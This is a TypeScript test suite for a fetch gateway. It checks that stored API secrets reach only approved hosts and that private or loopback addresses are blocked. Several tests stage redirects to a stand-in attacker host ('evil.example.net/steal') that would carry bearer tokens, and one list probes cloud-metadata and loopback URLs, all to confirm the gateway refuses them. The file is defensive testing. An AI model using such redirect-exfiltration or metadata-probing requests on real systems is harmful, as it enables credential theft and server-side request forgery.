import { env, fetchMock } from 'cloudflare:test'
import { afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { isPrivateAddress, resolvesToPrivate } from '../src/lib/host-guard.ts'
import { putSecret } from '../src/lib/secrets-store.ts'
import { handleGatewayRequest } from '../src/sandbox/fetch-gateway.ts'
import { dnsAnswers, dnsFailures, mockDns } from './dns-mock.ts'
import { applyMigrations, clearSecrets } from './setup-d1.ts'

// MCP-30: secrets never leave the allowlist, across redirects.

const SECRET = 'tok-s3cr3t-value'
const API = 'https://api.example.com'
const EVIL = 'https://evil.example.net'

interface Seen {
	method: string
	path: string
	headers: Headers
	body: string
}

/** Intercept one request to `origin` + `path`, record it and answer with `status`/`headers`. */
function upstream(
	origin: string,
	path: string,
	status = 200,
	headers: Record<string, string> = {},
	method = 'GET',
): Seen[] {
	const seen: Seen[] = []
	fetchMock
		.get(origin)
		.intercept({ path, method })
		.reply((opts) => {
			seen.push({
				method: opts.method,
				path: opts.path,
				headers: new Headers(opts.headers as Record<string, string>),
				body: opts.body == null ? '' : String(opts.body),
			})
			return { statusCode: status, data: 'ok', responseOptions: { headers } }
		})
	return seen
}

const authed = (url: string, init: RequestInit = {}) =>
	new Request(url, {
		...init,
		headers: {
			authorization: 'Bearer {{secret:API_TOKEN}}',
			'x-api-key': '{{secret:API_TOKEN}}',
			...(init.headers as Record<string, string>),
		},
	})

const leaked = (s: Seen) =>
	[...s.headers.values()].some((v) => v.includes(SECRET)) || s.body.includes(SECRET)

describe('fetch gateway allowlist (MCP-30)', () => {
	beforeAll(applyMigrations)
	beforeEach(async () => {
		await clearSecrets()
		await putSecret(
			{ name: 'API_TOKEN', value: SECRET, scope: 'app', allowedHosts: ['api.example.com'] },
			env,
		)
		dnsAnswers.clear()
		dnsFailures.clear()
		dnsAnswers.set('api.example.com', ['203.0.113.10'])
		fetchMock.activate()
		fetchMock.disableNetConnect()
		mockDns()
	})
	afterEach(() => fetchMock.deactivate())

	it('allowed flow is unchanged: the secret reaches the approved host', async () => {
		const seen = upstream(API, '/user')
		const res = await handleGatewayRequest(authed(`${API}/user`), env)
		expect(res.status).toBe(200)
		expect(seen[0].headers.get('authorization')).toBe(`Bearer ${SECRET}`)
		expect(seen[0].headers.get('x-api-key')).toBe(SECRET)
	})

	it('unapproved host gets no substitution (403 host_not_approved)', async () => {
		const seen = upstream(EVIL, '/user')
		const res = await handleGatewayRequest(authed(`${EVIL}/user`), env)
		expect(res.status).toBe(403)
		expect(((await res.json()) as { error: string }).error).toBe('host_not_approved')
		expect(seen).toHaveLength(0)
	})

	it('redirect-to-evil: the secret is not forwarded across hosts', async () => {
		upstream(API, '/login', 302, { location: `${EVIL}/steal` })
		const evil = upstream(EVIL, '/steal')
		const res = await handleGatewayRequest(authed(`${API}/login`), env)
		expect(res.status).toBe(200)
		expect(evil).toHaveLength(1)
		expect(evil[0].headers.get('authorization')).toBeNull()
		expect(evil[0].headers.get('x-api-key')).toBeNull()
		expect(leaked(evil[0])).toBe(false)
	})

	it('cross-host strips plain credential headers too (no placeholder)', async () => {
		upstream(API, '/a', 302, { location: `${EVIL}/b` })
		const evil = upstream(EVIL, '/b')
		await handleGatewayRequest(
			new Request(`${API}/a`, { headers: { authorization: 'Basic abc', cookie: 'sid=1' } }),
			env,
		)
		expect(evil[0].headers.get('authorization')).toBeNull()
		expect(evil[0].headers.get('cookie')).toBeNull()
	})

	it('same-host redirect keeps headers', async () => {
		upstream(API, '/v1/user', 301, { location: '/v2/user' })
		const v2 = upstream(API, '/v2/user')
		const res = await handleGatewayRequest(authed(`${API}/v1/user`), env)
		expect(res.status).toBe(200)
		expect(v2[0].headers.get('authorization')).toBe(`Bearer ${SECRET}`)
		expect(v2[0].headers.get('x-api-key')).toBe(SECRET)
	})

	it('a later cross-host hop still strips after a same-host hop', async () => {
		upstream(API, '/a', 302, { location: '/b' })
		upstream(API, '/b', 302, { location: `${EVIL}/c` })
		const evil = upstream(EVIL, '/c')
		await handleGatewayRequest(authed(`${API}/a`), env)
		expect(leaked(evil[0])).toBe(false)
	})

	// Redirects that look same-host but change the origin must still strip.
	it.each([
		['port-only', 'https://api.example.com:8443'],
		['scheme downgrade', 'http://api.example.com'],
		['subdomain', 'https://sub.api.example.com'],
	])('cross-origin %s redirect strips credential and secret headers', async (_, target) => {
		dnsAnswers.set('sub.api.example.com', ['203.0.113.11'])
		upstream(API, '/a', 302, { location: `${target}/b` })
		const next = upstream(target, '/b')
		const res = await handleGatewayRequest(authed(`${API}/a`), env)
		expect(res.status).toBe(200)
		expect(next).toHaveLength(1)
		expect(next[0].headers.get('authorization')).toBeNull()
		expect(next[0].headers.get('x-api-key')).toBeNull()
		expect(leaked(next[0])).toBe(false)
	})

	it('301 turns POST into GET and drops the body', async () => {
		upstream(API, '/form', 301, { location: '/done' }, 'POST')
		const done = upstream(API, '/done')
		const res = await handleGatewayRequest(
			authed(`${API}/form`, {
				method: 'POST',
				headers: { 'content-type': 'application/json' },
				body: '{"token":"{{secret:API_TOKEN}}"}',
			}),
			env,
		)
		expect(res.status).toBe(200)
		expect(done[0].method).toBe('GET')
		expect(done[0].body).toBe('')
		expect(done[0].headers.get('content-type')).toBeNull()
	})

	it('307 keeps method and body on a same-host redirect', async () => {
		upstream(API, '/form', 307, { location: '/form2' }, 'POST')
		const form2 = upstream(API, '/form2', 200, {}, 'POST')
		await handleGatewayRequest(
			authed(`${API}/form`, {
				method: 'POST',
				headers: { 'content-type': 'application/json' },
				body: '{"token":"{{secret:API_TOKEN}}"}',
			}),
			env,
		)
		expect(form2[0].method).toBe('POST')
		expect(form2[0].body).toBe(`{"token":"${SECRET}"}`)
	})

	it('307 cross-host with a secret-bearing body is refused', async () => {
		upstream(API, '/form', 307, { location: `${EVIL}/steal` }, 'POST')
		const evil = upstream(EVIL, '/steal', 200, {}, 'POST')
		const res = await handleGatewayRequest(
			new Request(`${API}/form`, {
				method: 'POST',
				headers: { 'content-type': 'application/json' },
				body: '{"token":"{{secret:API_TOKEN}}"}',
			}),
			env,
		)
		expect(res.status).toBe(403)
		expect(((await res.json()) as { error: string }).error).toBe('destination_blocked')
		expect(evil).toHaveLength(0)
	})

	it('307 cross-host with a plain body forwards the body but not the credentials', async () => {
		upstream(API, '/form', 307, { location: `${EVIL}/x` }, 'POST')
		const evil = upstream(EVIL, '/x', 200, {}, 'POST')
		await handleGatewayRequest(
			authed(`${API}/form`, {
				method: 'POST',
				headers: { 'content-type': 'text/plain' },
				body: 'hello',
			}),
			env,
		)
		expect(evil[0].method).toBe('POST')
		expect(evil[0].body).toBe('hello')
		expect(leaked(evil[0])).toBe(false)
	})

	it('redirect: manual returns the 3xx without following it', async () => {
		upstream(API, '/a', 302, { location: `${EVIL}/b` })
		const evil = upstream(EVIL, '/b')
		const res = await handleGatewayRequest(authed(`${API}/a`, { redirect: 'manual' }), env)
		expect(res.status).toBe(302)
		expect(evil).toHaveLength(0)
	})

	it.each([
		'http://[::1]:8080/',
		'http://[::ffff:127.0.0.1]/',
		'http://127.0.0.1/',
		'http://10.0.0.5/',
		'http://169.254.169.254/latest/meta-data',
		'http://localhost:9000/',
	])('blocks a private/loopback literal destination: %s', async (url) => {
		const res = await handleGatewayRequest(new Request(url), env)
		expect(res.status).toBe(403)
		expect(((await res.json()) as { error: string }).error).toBe('destination_blocked')
	})

	it('IPv6 loopback as a redirect target is blocked', async () => {
		upstream(API, '/a', 302, { location: 'http://[::1]/admin' })
		const res = await handleGatewayRequest(authed(`${API}/a`), env)
		expect(res.status).toBe(403)
		expect(((await res.json()) as { reason: string }).reason).toBe('private or loopback address')
	})

	it('DNS name resolving to a private IP is refused when it would carry a secret', async () => {
		await putSecret(
			{ name: 'API_TOKEN', value: SECRET, scope: 'app', allowedHosts: ['internal.example.com'] },
			env,
		)
		dnsAnswers.set('internal.example.com', ['10.1.2.3'])
		const seen = upstream('https://internal.example.com', '/x')
		const res = await handleGatewayRequest(authed('https://internal.example.com/x'), env)
		expect(res.status).toBe(403)
		expect(((await res.json()) as { reason: string }).reason).toBe('resolves to a private address')
		expect(seen).toHaveLength(0)
	})

	it('DNS check is best-effort: a resolver failure does not block (documented limit)', async () => {
		dnsAnswers.delete('api.example.com')
		dnsFailures.add('api.example.com')
		const seen = upstream(API, '/user')
		const res = await handleGatewayRequest(authed(`${API}/user`), env)
		expect(res.status).toBe(200)
		expect(seen).toHaveLength(1)
	})
})

describe('host guard', () => {
	it.each([
		['127.0.0.1', true],
		['[::1]', true],
		['::1', true],
		['[::]', true],
		['[::ffff:7f00:1]', true],
		['[::ffff:10.0.0.1]', true],
		['[64:ff9b::a00:1]', true],
		['[fd00::1]', true],
		['[fe80::1]', true],
		['10.0.0.1', true],
		['172.16.0.1', true],
		['172.32.0.1', false],
		['192.168.1.1', true],
		['100.64.0.1', true],
		['169.254.169.254', true],
		['0.0.0.0', true],
		['localhost', true],
		['app.localhost', true],
		['8.8.8.8', false],
		['[2606:4700::1111]', false],
		['[::ffff:8.8.8.8]', false],
		['api.example.com', false],
	])('isPrivateAddress(%s) = %s', (host, expected) => {
		expect(isPrivateAddress(host)).toBe(expected)
	})

	it('resolvesToPrivate checks AAAA answers too', async () => {
		fetchMock.activate()
		fetchMock.disableNetConnect()
		mockDns()
		dnsAnswers.set('v6.example.com', ['fd12::5'])
		try {
			expect(await resolvesToPrivate('v6.example.com')).toBe(true)
			expect(await resolvesToPrivate('[::1]')).toBe(true)
		} finally {
			fetchMock.deactivate()
		}
	})
})
